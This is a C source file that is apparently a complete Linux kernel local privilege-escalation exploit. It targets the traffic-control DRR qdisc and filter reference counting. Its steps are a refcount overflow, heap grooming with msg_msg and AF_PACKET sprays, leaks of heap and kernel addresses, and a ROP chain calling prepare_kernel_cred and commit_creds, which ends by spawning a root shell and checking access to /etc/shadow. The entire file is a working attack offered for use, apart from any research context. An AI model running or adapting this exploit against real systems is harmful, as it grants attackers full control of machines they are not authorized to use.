#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <asm/types.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "util.h"
#include "setup.h"
#include "usched.h"

#define ONEPAGE_K128_NUM 32
#define ONEPAGE_K256_NUM 16
#define DRAIN_PAGE_NUM 40
#define SPRAY_PAGE_NUM 16
#define PAGE_FENGSHUI_NUM 128
#define REUSE_PAGE_NUM 1

#define REF_BITS_NUM 16
#define REF_SIZE (1 << REF_BITS_NUM)

extern int g_tc_fd;
extern int g_tc_linkid;

static int g_qid[2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM];
static int g_drain_qid[DRAIN_PAGE_NUM * ONEPAGE_K128_NUM];
static int g_sock_fd[PAGE_FENGSHUI_NUM * 2];
static int g_reuse_qid[REUSE_PAGE_NUM * ONEPAGE_K128_NUM];
static int g_overflow_qid;

static int found_cross_qid = -1;
static int found_reuse_qid = -1;
static int found_overflowed_qid = -1;
static int overflowed_next_qid;
static uint64_t leaked_msg_addr;
static uint64_t leaked_inet_rcu_free_ifa;

static int start_copy_flag = 0;

static uint64_t usr_cs, usr_ss, usr_rsp, usr_rflags;

static void get_root_shell(void)
{
	int fd;
    char *args[] = { "/bin/bash", "-i", NULL };
    
    fd = open("/etc/shadow", O_RDONLY);
    if (fd < 0)
        errExit("[-] open /etc/shadow");
    close(fd);

    printf("[+] We are root now XD\n");
    execve(args[0], args, NULL);
}

static void send_packet_enqueue(void)
{
    int fd;
	int ret;
	struct sockaddr_in addr;
	char buffer[4096] = "larry";
	int prio = U_DS_QDISC_HANDLE | 0x42;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		errExit("[-] socket DGRAM");

	ret = setsockopt(fd, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
	if (ret < 0)
		errExit("[-] setsockopt SO_PRIORITY");

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(8081);
	
	ret = sendto(fd, buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, sizeof(addr));

	ret = close(fd);
	if (ret < 0)
		errExit("[-] close socket");

    printf("[+] Send packet enqueue done\n");
}

static void alloc_fake_obj(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    msg.mtype = 4;
    memset(msg.mtext, 'H', sizeof(msg.mtext));
    *(uint64_t *)(msg.mtext - 0x30 + 0x60) = leaked_msg_addr + 0x30; // drr_class->qdisc
    for (i = 0; i < 2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        //*(int *)msg.mtext = i;
        if (i == found_overflowed_qid)
            continue;
        ret = msgsnd(g_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    printf("[+] Alloc msg_msg to cross cache done\n");
}

static void fill_drain_kmalloc128(void)
{
    int i;

    for (i = 1; i <= DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_add_class(U_QDISC_HANDLE | (SPRAY_PAGE_NUM * ONEPAGE_K128_NUM + i));
    }

    printf("[+] Fill up original kmalloc-128 done\n");
}


static void set_rop_payload(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[1024 - 0x30];
    } msg;
    char buf[1024];
    uint64_t kernel_offset;
    uint64_t *rop;

    kernel_offset = leaked_inet_rcu_free_ifa - 0xffffffff81e3b5d0;
    memset(buf, 0, sizeof(buf));
    memset(&msg, 0, sizeof(msg));

    msg.mtype = 3;
    *(uint64_t *)(msg.mtext) = kernel_offset + 0xffffffff81c77562; // enqueue: push rsi ; jmp qword ptr [rsi + 0x66]
    *(uint64_t *)(msg.mtext + 32) = 0; // stab
    *(uint32_t *)(msg.mtext + 168) = 0; // q.len
    *(uint64_t *)(msg.mtext + 0x66) = kernel_offset + 0xffffffff8112af1e; // pop rsp ; pop r15 ; ret
    *(uint64_t *)(msg.mtext + 8) = kernel_offset + 0xffffffff8108bbd8; // add rsp, 0xb0 ; jmp 0xffffffff82404c80

    rop = (uint64_t *)(msg.mtext + 0xc0);
    // rcu_read_lock_bh()
    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = kernel_offset + 0xffffffff81d435bd;
    *rop++ = kernel_offset + 0xffffffff8103e8a8; // pop rsi ; ret
    *rop++ = 0x200;
    *rop++ = kernel_offset + 0xffffffff811941a0; // __local_bh_enable_ip(_THIS_IP_, SOFTIRQ_DISABLE_OFFSET)

    // rcu_read_unlock()
    *rop++ = kernel_offset + 0xffffffff8120e350; // __rcu_read_unlock

    // BUG: scheduling while atomic: poc/224/0x00000002
    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = 1;
    *rop++ = kernel_offset + 0xffffffff811c2d20; // preempt_count_sub

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = 0;
    *rop++ = kernel_offset + 0xffffffff811bb740; // prepare_kernel_cred

    *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    *rop++ = 0;
    *rop++ = kernel_offset + 0xffffffff82068a2b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404c80
    *rop++ = kernel_offset + 0xffffffff811bb490; // commit_creds

    // *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    // *rop++ = 1;
    // *rop++ = kernel_offset + 0xffffffff811b1e60; // find_task_by_vpid

    // *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    // *rop++ = 0;
    // *rop++ = kernel_offset + 0xffffffff82068a2b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404c80
    // *rop++ = kernel_offset + 0xffffffff8103e8a8; // pop rsi ; ret
    // *rop++ = kernel_offset + 0xffffffff836746a0; // &init_nsproxy
    // *rop++ = kernel_offset + 0xffffffff811b98f0; // switch_task_namespaces

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = kernel_offset + 0xffffffff837b1f20; // &init_fs
    *rop++ = kernel_offset + 0xffffffff8144b900; // copy_fs_struct
    *rop++ = kernel_offset + 0xffffffff811d9b0c; // push rax ; pop rbx ; jmp 0xffffffff82404c80

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = getpid();
    *rop++ = kernel_offset + 0xffffffff811b1e60; // find_task_by_vpid

    *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    *rop++ = 0x828;
    *rop++ = kernel_offset + 0xffffffff810705fe; // add rax, rcx ; jmp 0xffffffff82404c80
    *rop++ = kernel_offset + 0xffffffff816ac7a4; // mov qword ptr [rax], rbx ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp 0xffffffff82404c80
    rop += 8;

    *rop++ = kernel_offset + 0xffffffff82201146; // swapgs_restore_regs_and_return_to_usermode first mov
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (uint64_t)&get_root_shell;
    *rop++ = usr_cs;
    *rop++ = usr_rflags;
    *rop++ = usr_rsp;
    *rop++ = usr_ss;

    ret = msgrcv(g_qid[overflowed_next_qid], buf, sizeof(buf), 2, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the kmalloc-cg-1024 obj");
    ret = msgsnd(g_qid[overflowed_next_qid], &msg, sizeof(msg.mtext), 0);
    if (ret < 0)
        errExit("[-] msgsnd to alloc kmalloc-cg-1024 msg_msg");
    
    printf("[+] Set rop payload in kmalloc-cg-1024 done\n");
}

static void leak_kernel_addr(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[256];
    } msg;

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[overflowed_next_qid], &msg, 0x40, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the next one");

    send_add_addr();
    send_del_addr();

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[found_overflowed_qid], &msg, sizeof(msg.mtext), 0, IPC_NOWAIT | MSG_COPY);
    if (ret < 0)
        errExit("msgrcv to get leak msg");
    DumpHex(&msg, sizeof(msg));

    leaked_inet_rcu_free_ifa = *(uint64_t *)(msg.mtext + 0x50 + 0x28);
    if (leaked_inet_rcu_free_ifa == 0) {
        printf("[-] Cannot leak the inet_rcu_free_ifa addr :(\n");
        exit(-1);
    }
    
    printf("[+] Leak the kernel addr with inet_rcu_free_ifa: 0x%lx\n", leaked_inet_rcu_free_ifa);
}

static void leak_heap_addr(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[1024 - 0x30];
    } msg;

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[found_overflowed_qid], &msg, 256, 0, IPC_NOWAIT | MSG_COPY);
    if (ret < 0)
        errExit("msgrcv to get leak msg");
    overflowed_next_qid = *(int *)(msg.mtext + 0x80);
    
    // DumpHex(&msg, 256 + 8);
    // printf("\n");

    memset(msg.mtext, 'K', sizeof(msg.mtext));
    msg.mtype = 2;
    ret = msgsnd(g_qid[overflowed_next_qid], &msg, sizeof(msg.mtext), 0);
    if (ret < 0)
        errExit("[-] msgsnd to alloc msg_msg kmalloc-cg-1024");

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[found_overflowed_qid], &msg, 256, 0, IPC_NOWAIT | MSG_COPY);
    if (ret < 0)
        errExit("msgrcv to get leak msg");
    DumpHex(&msg, 256 + 8);

    leaked_msg_addr = *(uint64_t *)(msg.mtext + 0x50); // msg_msg.m_list.next
    printf("[+] Get the kmalloc-cg-1024 msg_msg heap addr: 0x%lx\n", leaked_msg_addr);
}

static void find_overflowed_one(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[256];
    } msg;

    memset(msg.mtext, 0, sizeof(msg.mtext));
    for (i = 0; i < SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        if (i == found_cross_qid)
            continue;
        ret = msgrcv(g_qid[i], &msg, sizeof(msg.mtext) - 1, 0, IPC_NOWAIT | MSG_COPY);
        if (ret < 0) {
            found_overflowed_qid = i;
            break;
        }
    }

    if (found_overflowed_qid < 0) {
        printf("[-] Cannot find the overflowed one :(\n");
        exit(-1);
    }

    printf("[+] Find the overflowed one is at %d msgq\n", found_overflowed_qid);
}

static void *change_copy_size(void *arg)
{
    int ret;

    assign_to_core(DEF_CORE + 1);

    while (start_copy_flag == 0)
        ;
    send_destory_filter();

    printf("\t[+] change_copy_size thread is done\n");
    return NULL;
}

static void *alloc_copy_msg(void *arg)
{
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    assign_to_core(DEF_CORE);
    memset(&msg, 0, sizeof(msg));

    usleep(1000);
    start_copy_flag = 1;
    ret = msgrcv(g_overflow_qid, &msg, 0x40, 0x2000, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
    if (ret > 0)
        printf("[+] Overflow msg_msg is done\n");

    printf("\t[+] alloc_copy_msg thread is done\n");
    return NULL;
}

static void change_msg_size(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;
    pthread_t alloc_thread, change_thread;

    ret = pthread_create(&change_thread, NULL, change_copy_size, NULL);
    if (ret < 0)
        errExit("[-] pthread_create change_copy_size thread");
    ret = pthread_create(&alloc_thread, NULL, alloc_copy_msg, NULL);
    if (ret < 0)
        errExit("[-] pthread_create alloc_copy_msg thread");

    ret = pthread_join(change_thread, NULL);
    if (ret < 0)
        errExit("[-] pthread_join change_copy_size thread");
    ret = pthread_join(alloc_thread, NULL);
    if (ret < 0)
        errExit("[-] pthread_join alloc_copy_msg thread");

    printf("[+] Change copy msg size with del filter done\n");
}

static void find_reuse_one(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[found_cross_qid], &msg, 0x3f, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the cross cache one");

    msg.mtype = 1;
    memset(msg.mtext, 'G', sizeof(msg.mtext));
    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgsnd(g_reuse_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    send_del_filter(0x43);

    memset(&msg, 0, sizeof(msg));
    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgrcv(g_reuse_qid[i], &msg, 0x3f, 0, IPC_NOWAIT | MSG_COPY);
        if (ret > 0) {
            found_reuse_qid = i;
            break;
        }
    }

    if (found_reuse_qid < 0) {
        printf("[-] Cannot find the reuse one :(\n");
        exit(-1);
    }

    printf("[+] Find the reuse one is at %d msgq\n", found_reuse_qid);

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_reuse_qid[found_reuse_qid], &msg, 0x3f, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the reuse one");

    msg.mtype = 2;
    memset(msg.mtext, 'H', sizeof(msg.mtext));
    for (i = 0; i < found_reuse_qid + 1; i++) {
        ret = msgsnd(g_reuse_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }
}

static void prepare_reuse_msg_queue(void)
{
    int i;
    int ret;
    int qid;

    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid < 0)
            errExit("[-] Get message queue");
        g_reuse_qid[i] = qid;
    }

    printf("[+] Prepare reuse msg queue done\n");
}

static void find_cross_cache(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    send_del_filter(0x42);
    sleep(5);

    memset(&msg, 0, sizeof(msg));
    for (i = 0; i < 2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgrcv(g_qid[i], &msg, 0x3f, 0, IPC_NOWAIT | MSG_COPY);
        if (ret > 0) {
            found_cross_qid = i;
            break;
        }
    }

    if (found_cross_qid < 0) {
        printf("[-] Cannot find the cross cache one :(\n");
        exit(-1);
    }

    printf("[+] Find the cross cache one is at %d msgq\n", found_cross_qid);
}

static void alloc_msg_msgs(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));
    for (i = 0; i < 2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        *(int *)msg.mtext = i;
        ret = msgsnd(g_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    printf("[+] Alloc msg_msg to cross cache done\n");
}

static void free_drr_classes(void)
{
    int i;

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_del_class(U_QDISC_HANDLE | (i));
    }

    for (i = 1; i <= DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_del_class(U_QDISC_HANDLE | (SPRAY_PAGE_NUM * ONEPAGE_K128_NUM + i));
    }

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        if ((i % ONEPAGE_K128_NUM) == 1)
            continue;
        send_del_class(U_QDISC_HANDLE | (i));
    }

    printf("[+] Free drr_class to buddy done\n");
}

static void bind_to_overflow(void)
{
    int i, j;

    for (i = 0; i < REF_SIZE - 0x100; i += 0x100) {
        for (j = 0x100 + 1; j > 1; j--)
            send_inc_filter(j - 1);
        send_clean_filter();
    }

    for (i = 1; i < 0x100 + 1; i++)
        send_inc_filter(i);

    printf("[+] Bind to overflow with 0x100 res can use\n");
}

static void alloc_drr_classes(void)
{
    int i;

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        send_add_class(U_QDISC_HANDLE | (i));
        //printf("[*] send add class #%x done\n", U_QDISC_HANDLE | (i));
    }

    printf("[+] Alloc drr_class to use done\n");
}

static int alloc_pages_via_sock(uint32_t size, uint32_t n)
{
    int fd;
    int ret;
    struct tpacket_req req;
    int32_t version;

    fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (fd < 0)
        errExit("[-] Create AF_PACKET socket");

    version = TPACKET_V1;
    ret = setsockopt(fd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));
    if (ret < 0)
        errExit("[-] setsockopt PACKET_VERSION");

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0)
        errExit("[-] setsockopt PACKET_TX_RING");

    return fd;
}

static void prepare_page_fengshui(void)
{
    int i;
    int ret;

    for (i = 0; i < PAGE_FENGSHUI_NUM * 2; i++) {
        g_sock_fd[i] = alloc_pages_via_sock(4096, 1);
        //printf("[*] alloc page #%d done\n", i);
    }
    for (i = 0; i < PAGE_FENGSHUI_NUM * 2; i += 2) {
        ret = close(g_sock_fd[i]);
        if (ret < 0)
            errExit("[-] Close AF_PACKET socket");
        //printf("[*] free page #%d done\n", i);
    }

    printf("[+] Prepare page fengshui with AF_PACKET done\n");
}

static void drain_kmalloc_128(void)
{
    int i;

    for (i = 1; i <= DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        send_add_class(U_QDISC_HANDLE | (SPRAY_PAGE_NUM * ONEPAGE_K128_NUM + i));
    }

    printf("[+] Drain kmalloc-128 with drr_class done\n");
}

static void drain_kmalloc_cg_128(void)
{
    int i;
    int ret;
    int qid;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    for (i = 0; i < DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid < 0)
            errExit("[-] Get message queue");
        g_drain_qid[i] = qid;
    }

    msg.mtype = 1;
    memset(msg.mtext, 'C', sizeof(msg.mtext));
    for (i = 0; i < DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgsnd(g_drain_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    printf("[+] Drain kmalloc-cg-128 with msg_msg done\n");
}

static void prepare_overflow_msg_queue(void)
{
    int i;
    int ret;
    int qid;
    struct msgbuf {
        long mtype;
        char mtext[0x70];
    } msg;

    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid < 0)
        errExit("[-] Get message queue");
    g_overflow_qid = qid;

    msg.mtype = 1;
    memset(msg.mtext, 'D', sizeof(msg.mtext));
    for (i = 0; i < 0x2000; i++) {
        ret = msgsnd(g_overflow_qid, &msg, 1, 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    msg.mtype = 1;
    memset(msg.mtext, 'D', sizeof(msg.mtext));
    memset(msg.mtext + 0x50, 0, 0x20);
    *(uint64_t *)(msg.mtext + 0x60) = 1; // m_type
    *(uint64_t *)(msg.mtext + 0x68) = 256; // m_ts

    ret = msgsnd(g_overflow_qid, &msg, sizeof(msg.mtext), 0);
    if (ret < 0)
        errExit("[-] msgsnd to alloc msg_msg");

    printf("[+] Prepare overflow msg_queue done\n");
}

static void prepare_msg_queue(void)
{
    int i;
    int qid;

    for (i = 0; i < 2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid < 0)
            errExit("[-] Get message queue");
        g_qid[i] = qid;
    }

    printf("[+] Prepare msg queue done\n");
}

static void prepare_tc_env(void)
{
    int ret;
    int fd;
    int link_id;
    struct sockaddr_nl sa;

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    sa.nl_pid = getpid();

    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0)
        errExit("[-] Create NETLINK_ROUTE socket");
    ret = bind(fd, (struct sockaddr *) &sa, sizeof(sa));
    if (ret < 0)
        errExit("[-] Bind NETLINK_ROUTE socket");

    link_id = rt_getlink(fd, LINK_NAME);
    rt_setlink(fd, link_id);
    rt_newqdisc_ds(fd, link_id, U_DS_QDISC_HANDLE);
    rt_newqdisc_drr(fd, link_id, U_QDISC_HANDLE);

    rt_setclass_add(link_id);
    rt_setclass_del(link_id);

    rt_setfilter_inc(link_id);
    rt_setfilter_clean(link_id);
    rt_setfilter_del(link_id);

    rt_setaddr_add(link_id);
    rt_setaddr_del(link_id);

    g_tc_fd = fd;
    g_tc_linkid = link_id;
    printf("[+] Prepare tc env done\n");
}

static void save_state()
{
    __asm__ __volatile__(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rsp), "=r" (usr_rflags) : : "memory" );
    printf("[+] Save state with ss 0x%lx, rsp 0x%lx done\n", usr_ss, usr_rsp);
}

int main(void)
{
    assign_to_core(DEF_CORE);
    save_state();
    setup_sandbox();
    
    prepare_tc_env();
    prepare_msg_queue();
    prepare_overflow_msg_queue();
    prepare_reuse_msg_queue();

    drain_kmalloc_cg_128();
    drain_kmalloc_128();
    prepare_page_fengshui();
    alloc_drr_classes();
    bind_to_overflow();
    free_drr_classes();
    alloc_msg_msgs();

    find_cross_cache();
    find_reuse_one();
    sleep(1); // sleep to debug on server :)
    change_msg_size();
    find_overflowed_one();

    leak_heap_addr();
    leak_kernel_addr();
    set_rop_payload();

    fill_drain_kmalloc128();
    alloc_drr_classes();
    bind_to_overflow();
    free_drr_classes();
    alloc_fake_obj();

    // printf("[*] sleep to enqueue\n");
    // sleep(100);
    // printf("[*] getchar to enqueue\n");
    // getchar();

    send_packet_enqueue();
    printf("[-] We cannot reclaim to hijack enqueue here :(\n");

    return 0;
}